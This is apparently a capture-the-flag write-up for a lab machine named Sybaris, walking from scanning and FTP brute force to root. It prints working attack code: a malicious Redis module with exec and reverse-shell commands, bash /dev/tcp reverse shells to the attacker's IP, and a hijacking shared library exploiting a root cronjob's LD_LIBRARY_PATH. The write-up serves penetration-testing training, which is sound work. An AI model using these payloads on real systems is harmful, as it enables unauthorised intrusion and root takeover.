# CTF Writeup: Sybaris

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.198.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 11:32 EST
Nmap scan report for 192.168.198.93
Host is up (0.030s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open   ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
|_  256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
80/tcp    open   http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-title: Sybaris - Just another HTMLy blog
|_http-generator: HTMLy v2.7.5
6379/tcp  open   redis     Redis key-value store 5.0.9
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (93%), Linux 3.10 (92%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 3.8 - 3.16 (90%), Linux 3.4 - 3.10 (90%), OpenWrt 19.07 (Linux 4.14) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   29.39 ms 192.168.45.1
2   29.38 ms 192.168.45.254
3   29.45 ms 192.168.251.1
4   29.44 ms 192.168.198.93

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
```

I was able to access the ftp share anonymously, but the directory in which I was able to navigate seemed empty.

Let's bruteforce ftp credentials.

```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.198.93
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-25 13:23:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.198.93:21/
[21][ftp] host: 192.168.198.93   login: anonymous   password: anonymous
[21][ftp] host: 192.168.198.93   login: ftp   password: b1uRR3
[21][ftp] host: 192.168.198.93   login: ftp   password: ftp
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-25 13:24:04
```

Accessing ftp with the retrieved credentials lead to the same result. We weren't able to gather more information since it was the same share.

Enumerating endpoints on the website running on port 80, was very promising.
We retrieved an exposed /admin panel and an humans.txt file in which many potential usernames are inside.

```
dirsearch -u http://192.168.198.93          
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.198.93/_25-12-25_12-58-24.txt

Target: http://192.168.198.93/

[12:58:24] Starting:                                                                                                                          
[12:58:27] 403 -  213B  - /.ht_wsr.txt                                      
[12:58:27] 403 -  216B  - /.htaccess_orig                                   
[12:58:27] 403 -  217B  - /.htaccess_extra
[12:58:27] 403 -  216B  - /.htaccess.orig
[12:58:27] 403 -  216B  - /.htaccess.bak1
[12:58:27] 403 -  218B  - /.htaccess.sample                                 
[12:58:27] 403 -  214B  - /.htaccess_sc                                     
[12:58:27] 403 -  216B  - /.htaccess.save
[12:58:27] 403 -  214B  - /.htaccessBAK
[12:58:28] 403 -  214B  - /.htaccessOLD
[12:58:28] 403 -  215B  - /.htaccessOLD2
[12:58:28] 403 -  207B  - /.html
[12:58:28] 403 -  206B  - /.htm
[12:58:28] 403 -  216B  - /.htpasswd_test                                   
[12:58:28] 403 -  212B  - /.htpasswds                                       
[12:58:28] 403 -  213B  - /.httr-oauth                                      
[12:58:29] 403 -  211B  - /.user.ini                                        
[12:58:32] 302 -    0B  - /admin  ->  /login                                
[12:58:32] 302 -    0B  - /admin%20/  ->  /login                            
[12:58:33] 302 -    0B  - /admin/  ->  /login                               
[12:58:33] 302 -    0B  - /admin/backup/  ->  /login                        
[12:58:39] 301 -  236B  - /cache  ->  http://192.168.198.93/cache/          
[12:58:39] 403 -  208B  - /cache/                                           
[12:58:39] 403 -  210B  - /cgi-bin/                                         
[12:58:39] 404 -  214B  - /cgi-bin/awstats/
[12:58:39] 404 -  216B  - /cgi-bin/awstats.pl
[12:58:39] 404 -  216B  - /cgi-bin/htmlscript                               
[12:58:39] 404 -  211B  - /cgi-bin/login                                    
[12:58:39] 404 -  217B  - /cgi-bin/htimage.exe?2,2
[12:58:39] 404 -  218B  - /cgi-bin/imagemap.exe?2,2
[12:58:39] 404 -  216B  - /cgi-bin/index.html
[12:58:39] 404 -  215B  - /cgi-bin/login.cgi
[12:58:39] 404 -  224B  - /cgi-bin/a1stats/a1disp.cgi
[12:58:39] 404 -  219B  - /cgi-bin/mt-xmlrpc.cgi
[12:58:39] 404 -  212B  - /cgi-bin/mt.cgi                                   
[12:58:39] 404 -  222B  - /cgi-bin/mt/mt-xmlrpc.cgi
[12:58:39] 404 -  215B  - /cgi-bin/login.php
[12:58:39] 404 -  215B  - /cgi-bin/mt/mt.cgi
[12:58:39] 404 -  223B  - /cgi-bin/mt7/mt-xmlrpc.cgi
[12:58:39] 404 -  213B  - /cgi-bin/php.ini
[12:58:40] 404 -  214B  - /cgi-bin/printenv
[12:58:40] 404 -  217B  - /cgi-bin/printenv.pl
[12:58:40] 404 -  214B  - /cgi-bin/test-cgi
[12:58:40] 404 -  217B  - /cgi-bin/ViewLog.asp
[12:58:40] 404 -  214B  - /cgi-bin/test.cgi
[12:58:40] 404 -  216B  - /cgi-bin/mt7/mt.cgi                               
[12:58:40] 200 -    2KB - /composer.lock                                    
[12:58:40] 200 -  286B  - /composer.json                                    
[12:58:41] 403 -  208B  - /config                                           
[12:58:41] 403 -  216B  - /config/app.yml                                   
[12:58:41] 403 -  216B  - /config/apc.php
[12:58:41] 403 -  209B  - /config/
[12:58:41] 403 -  216B  - /config/app.php
[12:58:41] 403 -  225B  - /config/banned_words.txt
[12:58:41] 403 -  216B  - /config/aws.yml
[12:58:41] 403 -  219B  - /config/config.ini
[12:58:41] 403 -  219B  - /config/config.inc                                
[12:58:41] 403 -  218B  - /config/autoload/
[12:58:41] 403 -  223B  - /config/AppData.config
[12:58:41] 403 -  229B  - /config/database.yml.sqlite3
[12:58:41] 403 -  227B  - /config/database.yml.pgsql
[12:58:41] 403 -  222B  - /config/databases.yml
[12:58:41] 403 -  222B  - /config/database.yml~
[12:58:41] 403 -  221B  - /config/database.yml
[12:58:41] 403 -  215B  - /config/db.inc
[12:58:41] 403 -  237B  - /config/initializers/secret_token.rb
[12:58:41] 403 -  221B  - /config/development/
[12:58:41] 403 -  219B  - /config/master.key
[12:58:41] 403 -  223B  - /config/monkdonate.ini
[12:58:41] 403 -  225B  - /config/monkcheckout.ini
[12:58:41] 403 -  219B  - /config/monkid.ini
[12:58:41] 403 -  219B  - /config/routes.yml
[12:58:41] 403 -  221B  - /config/producao.ini
[12:58:41] 403 -  221B  - /config/settings.inc
[12:58:41] 403 -  227B  - /config/settings.local.yml
[12:58:41] 403 -  225B  - /config/settings.ini.cfm
[12:58:41] 403 -  213B  - /config/xml/
[12:58:41] 403 -  217B  - /config/site.php
[12:58:41] 403 -  221B  - /config/settings.ini
[12:58:41] 403 -  232B  - /config/settings/production.yml                   
[12:58:41] 301 -  238B  - /content  ->  http://192.168.198.93/content/      
[12:58:41] 403 -  210B  - /content/                                         
[12:58:41] 200 -  945B  - /COPYRIGHT.txt                                    
[12:58:45] 200 -    1KB - /favicon.ico                                      
[12:58:48] 200 -  377B  - /humans.txt                                       
[12:58:49] 200 -    2KB - /index                                            
[12:58:50] 301 -  235B  - /lang  ->  http://192.168.198.93/lang/            
[12:58:51] 200 -    7KB - /LICENSE.txt                                      
[12:58:51] 200 -    1KB - /login                                            
[12:58:51] 200 -    1KB - /login/                                           
[12:58:52] 302 -    0B  - /logout/  ->  /login                              
[12:58:52] 302 -    0B  - /logout  ->  /login                               
[12:58:59] 302 -    0B  - /rack_session/edit  ->  /login                    
[12:58:59] 200 -    3KB - /README.md                                        
[12:59:00] 200 -  510B  - /robots.txt                                       
[12:59:02] 200 -  181B  - /sitemap.xml                                      
[12:59:04] 301 -  237B  - /system  ->  http://192.168.198.93/system/        
[12:59:04] 403 -  209B  - /system/                                          
[12:59:05] 403 -  209B  - /themes/                                          
[12:59:05] 301 -  237B  - /themes  ->  http://192.168.198.93/themes/
[12:59:07] 302 -    0B  - /upload.php  ->  /login
```

We tried to guess credentials and also utilize the contributor names which we retrieved in the /humans.txt endpoint. But nothing seemed to work. I'm certain this isn't the way to get initial access.

Let's move on to redis. We already identified the redis version 5.0.9

Trying to access the redis database anonymously worked!

```
redis-cli -h 192.168.198.93 
192.168.198.93:6379>
```

## Initial Access

I found an exploit way on hacktricks, in which we can load an malicious module into redis, upload it to an ftp share and gain command execution.

Utilized following PoC:

```
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

I had to modify the module.c file from the git repo like that, in order for it to work:


```
cat module.c     
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                char *env[] = {NULL};
                execve("/bin/sh", args, env);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
          if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}

```

We then build the module.

```
make
```

We put the module into the ftp "pub" share.

```
ftp> put module.so
local: module.so remote: module.so
229 Entering Extended Passive Mode (|||10091|).
150 Ok to send data.
100% |*************************************************************************************************| 48000      983.52 KiB/s    00:00 ETA
226 Transfer complete.
```

We then logged into redis-cli anonymously and loaded the module from the server.
The default path for ftp is usually /var/ftp.


```
redis-cli -h 192.168.198.93
192.168.198.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
```

As we can see this seemed to work, which means we should now have command execution.

```
192.168.198.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

Indeed, we do!

Let's get RCE now as user "pablo".

Starting up my listener on port 80.

```
nc -lvnp 80
```

Utilized the following bash command in order to get RCE.

```
192.168.198.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.167/80 0>&1"
```

Gained RCE as user "pablo".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.198.93] 36226
bash: no job control in this shell
[pablo@sybaris /]$
```

Retrieved local.txt in /home/pablo directory.

```
40225037224777298caa6de87e206f61
```

## Privilege Escalation

Performed shell hardening.

```
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated users on the target.

```
[pablo@sybaris ~]$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
pablo:x:1000:1000::/home/pablo:/bin/bash
```

Discovered password for user "pablo" in /var/www/html/config/users/pablo.ini

```
[pablo@sybaris users]$ cat pablo.ini
password = PostureAlienateArson345
role = admin
```

There seems to be some running cronjob, which executes an log-sweeper binary.

```
[pablo@sybaris ~]$ cat /etc/crontab
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper
```

Analyzing the cronjob we can tell that the "LD_LIBRARY_PATH" is linked to /usr/local/lib/dev.

Let's check out which directories we got write access on.

```
[pablo@sybaris users]$ find / -type d -writable 2>/dev/null
/dev/mqueue
/dev/shm
/proc/14886/task/14886/fd
/proc/14886/fd
/proc/14886/map_files
/var/tmp
/var/log/redis
/var/ftp/pub
/tmp
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/usr/local/lib/dev
/home/pablo
```

When running the log-sweeper binary, we can tell that it's missing an shared library file called "utils.so".

```
[pablo@sybaris users]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
```

Apparently we have write access to the library which is linked to the cronjob log-sweeper binary running on root rights. This is an severe misconfiguration, since we can just add an malicious script, impersonate utils.so in the directory and elevate our privileges.

Created an malicious reverse shell .c script.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {

    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.45.167/22 0>&1");
}
```

Compiled the .c file into "utils.so" file on my local machine.

```
gcc -shared -fPIC -nostartfiles exploit.c -o utils.so
```

Started up an python web server.

```
python3 -m http.server 80
```

Downloaded the file onto the target system into the /usr/local/lib/dev directory.

```
wget http://192.168.45.167/utils.so
```

Since this .so file is getting processed through the cronjob running on root, we should be able to get RCE as user "root".

Let's start up an listener on port 22, since our malicious script is configured for this port.

```
nc -lvnp 22
```

Gained RCE as user "root".

```
nc -lvnp 22                                
listening on [any] 22 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.198.93] 44634
bash: no job control in this shell
[root@sybaris ~]#
```

Retrieved proof.txt in /root directory.

```
7df21dac26323e72cea5fabeff647fb8
```
